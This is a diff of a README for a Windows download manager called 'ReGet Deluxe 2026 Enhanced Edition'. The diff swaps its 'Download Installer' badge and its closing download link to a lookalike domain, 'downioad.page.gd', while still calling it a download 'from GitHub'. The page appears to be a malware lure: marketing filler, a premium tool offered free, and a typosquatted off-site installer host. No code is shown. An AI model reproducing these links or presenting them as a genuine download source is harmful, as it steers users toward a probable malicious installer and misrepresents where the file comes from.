@@ -2,7 +2,7 @@
 
 ReGet Deluxe 2026 Enhanced Edition is a comprehensive software tool designed to revolutionize your download management on Windows desktops. Built with advanced features and a user-friendly interface, it provides an efficient way to handle multiple downloads, customize settings, and optimize performance for both casual and power users.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## System Requirements
 
@@ -69,7 +69,7 @@ The tool is continuously updated to address new challenges in download managemen
 
 For the latest version and to access additional resources, please use the following link:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: November 2026*
 
